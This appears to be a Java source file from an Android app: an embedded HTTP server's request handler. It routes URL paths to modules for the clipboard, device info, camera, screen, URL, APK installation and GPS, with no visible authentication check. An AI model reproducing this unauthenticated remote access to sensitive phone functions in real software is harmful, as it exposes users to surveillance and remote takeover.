package com.weibo.vip.skynet.webserver;

import java.io.IOException;
import java.net.URLDecoder;
import java.util.HashMap;
import java.util.Map;

import org.apache.http.HttpException;
import org.apache.http.HttpRequest;
import org.apache.http.HttpResponse;
import org.apache.http.HttpStatus;
import org.apache.http.protocol.HttpContext;
import org.apache.http.protocol.HttpRequestHandler;
import org.json.JSONException;

import android.annotation.SuppressLint;
import android.content.Context;
import android.util.Log;

import com.weibo.vip.skynet.Constants;
import com.weibo.vip.skynet.dm.Apk;
import com.weibo.vip.skynet.dm.Camera;
import com.weibo.vip.skynet.dm.Clipboard;
import com.weibo.vip.skynet.dm.Deviceinfo;
import com.weibo.vip.skynet.dm.Gps;
import com.weibo.vip.skynet.dm.Screen;
import com.weibo.vip.skynet.dm.URL;
import com.weibo.vip.skynet.dm.VIPHttpHandler;

@SuppressLint("DefaultLocale")
public class HttpHandler implements HttpRequestHandler{

	Context mContext;
	private Map<String, VIPHttpHandler> registerMap;
	
	public HttpHandler(Context context){
		mContext = context;
	}
	
	@Override
	public void handle(HttpRequest request, HttpResponse response,HttpContext context) throws HttpException, IOException {
        String target = URLDecoder.decode(request.getRequestLine().getUri(), Constants.ENCODING);
        String[] urlpart =target.split("/");
        //过滤Url黑名单
        if (target.equals("/favicon.ico")) {
        	response.setStatusCode(HttpStatus.SC_NOT_FOUND);
			return;
		}
        if (urlpart.length <= 2) {
        	response.setStatusCode(HttpStatus.SC_NOT_FOUND);
        	return;
        }
        Log.v("HttpRequest", "recive request: "+target);
        
        //处理Url请求
    	try {
	         String classNameString = urlpart[1].toLowerCase();
	         registerMap = new HashMap<String, VIPHttpHandler>();
	         registerMap.put("clipboard",new Clipboard());
	         registerMap.put("device", new Deviceinfo());
	         registerMap.put("camera", new Camera());
	         registerMap.put("screen", new Screen());
	         registerMap.put("url", new URL());
	         registerMap.put("apk", new Apk());
	         registerMap.put("gps", new Gps());
	         
	         if (registerMap.containsKey(classNameString)) {
				VIPHttpHandler handler = registerMap.get(classNameString);
				handler.handler(request, response, context);
			}
	 		
    	} catch (JSONException e) {
			e.printStackTrace();
		}
	}

}
